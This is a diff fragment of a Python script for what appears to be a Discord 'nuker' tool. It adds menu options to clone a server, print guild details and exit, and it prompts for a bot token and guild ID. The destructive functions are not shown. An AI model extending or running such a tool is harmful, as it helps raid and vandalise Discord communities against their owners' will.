+        if nuker.clone_server(target_guild):
+            Logger.Success.success("Server cloned successfully!")
+        else:
+            Logger.Error.error("Failed to clone server")
+
+        return await back_to_manu()
+
+    elif choice == "31":
+        # Server Info & Analytics
+        print(f"""
+Server Information:
+- Name: {info['guild']['name']}
+- ID: {info['guild']['id']}
+- Owner: {info['guild']['owner_id']}
+- Members: {info['guild']['member_count']}
+- Channels: {info['guild']['channels']}
+- Roles: {info['guild']['roles']}
+- Created: {info['guild']['creation_date']}
+        """)
+        return await back_to_manu()
+
+    elif choice == "32":
+        print("Goodbye!")
+        sys.exit()
+
+# تشغيل البوت
 if __name__ == "__main__":
-    args = sys.argv
-
-    start(args)
+    token = input("Enter bot token: ")
+    guild_id = input("Enter guild ID: ")
+    asyncio.run(main(token, guild_id))
